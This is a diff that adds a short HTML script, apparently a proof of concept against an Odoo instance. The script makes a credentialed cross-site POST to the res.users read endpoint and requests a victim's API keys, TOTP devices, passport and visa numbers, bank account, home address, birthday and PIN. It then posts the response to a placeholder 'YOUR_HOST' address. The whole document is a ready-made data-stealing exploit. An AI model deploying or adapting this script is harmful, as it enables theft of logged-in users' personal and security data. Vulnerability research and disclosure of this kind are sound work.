@@ -1,0 +1,40 @@
+<script>
+const jsonData = {
+  "id": 29,
+  "jsonrpc": "2.0",
+  "method": "call",
+  "params": {
+    "args": [
+      [2],
+      ["write_date", "avatar_128", "hr_presence_state", "last_activity_time", "last_activity", "show_leaves", "employee_ids", "is_absent", "hr_icon_display", "leave_date_to", "allocation_remaining_display", "allocation_display", "sign_request_count", "document_count", "image_1920", "name", "job_title", "can_edit", "mobile_phone", "work_phone", "work_email", "work_location_id", "company_id", "employee_parent_id", "coach_id", "notification_type", "email", "lang", "tz", "is_system", "tz_offset", "share", "signature", "totp_enabled", "totp_trusted_device_ids", "api_key_ids", "resume_line_ids", "employee_skill_ids", "department_id", "address_id", "leave_manager_id", "expense_manager_id", "timesheet_manager_id", "child_ids", "address_home_id", "private_street", "private_street2", "private_city", "private_state_id", "private_zip", "private_country_id", "private_email", "employee_phone", "private_lang", "employee_bank_account_id", "km_home_work", "employee_country_id", "identification_id", "passport_id", "gender", "birthday", "place_of_birth", "country_of_birth", "marital", "spouse_complete_name", "spouse_birthdate", "certificate", "study_field", "study_school", "children", "emergency_contact", "emergency_phone", "visa_no", "permit_no", "visa_expire", "employee_type", "pin", "barcode", "display_name"]
+    ],
+    "model": "res.users",
+    "method": "read",
+    "kwargs": {
+      "context": {
+        "lang": "en_US",
+        "tz": "Europe/Brussels",
+        "uid": 2,
+        "allowed_company_ids": [1],
+        "bin_size": true,
+        "from_my_profile": true
+      }
+    }
+  }
+};
+
+const url = 'https://demo5.odoo.com/web/dataset/call_kw/res.users/read'; 
+
+fetch(url, {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(jsonData)
+})
+  .then(response => response.text())
+  .then(data => {
+fetch('YOUR_HOST',{method:'POST',body:data})
+})
+</script>
